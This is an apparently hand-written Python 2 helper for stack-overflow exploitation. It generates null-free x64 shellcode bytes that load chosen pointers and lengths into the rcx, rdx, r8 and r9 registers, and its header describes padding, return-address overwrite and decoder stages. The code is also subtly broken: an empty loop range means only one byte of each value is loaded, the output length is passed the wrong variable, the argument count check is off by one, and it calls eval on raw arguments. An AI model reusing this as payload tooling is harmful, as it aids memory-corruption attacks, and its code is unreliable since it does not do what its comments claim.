#!python

import sys


#############################################
#       stack overflow shellcode handing
#     we build shell code in this way
#     dummy_code_size:
#           dummycode before overflow return address
#     return_addr:
#           return address from the ip
#     code_decode:
#           code to decode origin shell code
#     real_shellcode:
#           real shell code to run make sure 
#           the real_shell code could not exceed (1<<16) size
#
#############################################



def get_value(addrval,shiftval):
	codes = []
	curcode = addrval >> shiftval
	if curcode & 0xff == 0 :
		# if it is null ,so it will give the xor al,al code
		codes.extend([0x32,0xc0])
	else:
		mvval = curcode & 0xff
		codes.extend([0xb0,mvval])
	return codes


####################################
#  this code is like this
# 48 33 C0           xor         rax,rax
# 32 C0              xor         al,al
# B0 11              mov         al,11h
# 48 C1 E0 08        shl         rax,8
# B0 22              mov         al,22h
# 48 C1 E0 08        shl         rax,8
# B0 33              mov         al,33h
# 48 C1 E0 08        shl         rax,8
# B0 11              mov         al,11h
# 48 C1 E0 08        shl         rax,8
# B0 22              mov         al,22h
# 48 C1 E0 08        shl         rax,8
# B0 33              mov         al,33h
# 48 C1 E0 08        shl         rax,8
# B0 44              mov         al,44h
# 48 C1 E0 08        shl         rax,8
# B0 44              mov         al,44h
# lastcode is the move rdx,rax or other code for move to other value
####################################
def makeparam(lastcode,val):
	codes = []
	codes.extend([0x48,0x33,0xc0])
	codes.extend([0x32,0xc0])
	for i in range(7,1):
		codes.extend(get_value(val,i*8))
		codes.extend([0x48,0xC1,0xE0,0x08])
	codes.extend(get_value(val,0))
	codes.extend(lastcode)
	return codes

def makeinputbuf(ptrval):
	# for mov rcx,rax
	return makeparam([0x48,0x8B,0xC8],ptrval)

def makeinputlen(inputlen):
	# for mov rdx,rax
	return makeparam([0x48,0x8B,0xD0],inputlen)

def makeoutbuf(ptrval):
	# for mov r8,rax
	return makeparam([0x4C,0x8B,0xC0],ptrval)

def makeoutputlen(outputlen):
	# for mov r9,rax
	return makeparam([0x4C,0x8B,0xC8],outputlen)

def makebuf(codes):
	i = 0
	s = ""
	for c in codes:
		if (i % 16) == 0 and i != 0 :
			s += '\n'
		if i != 0  :
			s += ','
		s += '0x%02x'%(c)
		i += 1
	return s

def main():
	if len(sys.argv) < 4 :
		sys.stderr.write('%s '%(sys.argv[0]))
		sys.exit(4)
	codes = []
	try:
		inputbuf = int(eval(sys.argv[1]))
		inputlen = int(eval(sys.argv[2]))
		outputbuf = int(eval(sys.argv[3]))
		outputlen = int(eval(sys.argv[4]))
	except:
		sys.stderr.write('error occur')
		return
	print 'inputbuf 0x%x inputlen 0x%x outputbuf 0x%x outpublen 0x%x'%(inputbuf,inputlen,outputbuf,outputlen)
	codes.extend(makeinputbuf(inputbuf))
	codes.extend(makeinputlen(inputlen))
	codes.extend(makeoutbuf(outputbuf))
	codes.extend(makeoutputlen(outputbuf))
	print makebuf(codes)

if __name__ == '__main__':
	main()
